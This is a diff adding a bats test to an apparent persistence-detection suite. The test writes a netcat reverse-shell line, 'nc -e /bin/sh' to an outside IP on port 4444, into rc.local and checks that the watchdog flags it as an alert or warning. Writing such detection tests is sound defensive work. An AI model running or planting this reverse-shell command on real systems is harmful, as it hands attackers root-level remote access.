@@ -253,3 +253,17 @@ seed_benign() {
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in rc.local: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
+    # dhclient-hooks/bash-completion/anacrontab/apt-hooks nc
+    # reverse-shell variant INVARIANTs across the brain. Lock the
+    # netcat axis on SysV boot-time root-exec persistence surface
+    # (T1037 — rc.local runs AS ROOT at boot).
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${RCFILE}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
